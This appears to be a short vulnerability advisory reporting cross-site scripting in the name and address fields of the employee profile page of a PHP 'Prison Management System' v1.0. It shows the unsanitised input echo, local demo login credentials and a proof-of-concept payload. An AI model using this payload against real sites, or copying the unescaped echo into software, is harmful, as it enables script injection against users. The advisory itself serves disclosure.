# Prison Management System
## XSS on `/Employee/edit-profile.php`

### Vendor Homepage:

```
https://www.sourcecodester.com/sql/17287/prison-management-system.html
```

### Version:

```
V1.0
```

### Tested on:

```
PHP, Apache, MySQL
```

### Credentials:

```
http://localhost/prison/Account/login.php
password:- escobar2012
Email :- releaseme@gmail.com
```

### Affected Page:

```
/Employee/edit-profile.php
```

The parameter  `txtfullname` and `txtaddress` are being echoed directly into the HTML without proper sanitization or validation. This allows an attacker to inject arbitrary JavaScript code into the page, leading to XSS attacks.

```php
# Employee/edit-profile.php
<input type="text" size="77" name="txtaddress" value=""><svg/onload=alert(1)>" class="form-control">
<input type="text" size="77" name="txtfullname" value=""><svg/onload=alert(1)>" class="form-control" required="">
```

### Proof of Concept:

Payload:

```
"><svg/onload=alert(1)>
```


### Screenshot
![1](https://github.com/user-attachments/assets/91a83b9f-452c-444d-98f9-9f242919d6c2)

![4](https://github.com/user-attachments/assets/d3d1bcb8-b20a-4b44-aed4-0be8299e30fb)

![3](https://github.com/user-attachments/assets/5087db72-8b45-44c6-ad3e-34157b78b11f)

![2](https://github.com/user-attachments/assets/8dff777a-2c8d-466b-a072-43523ae747d9)



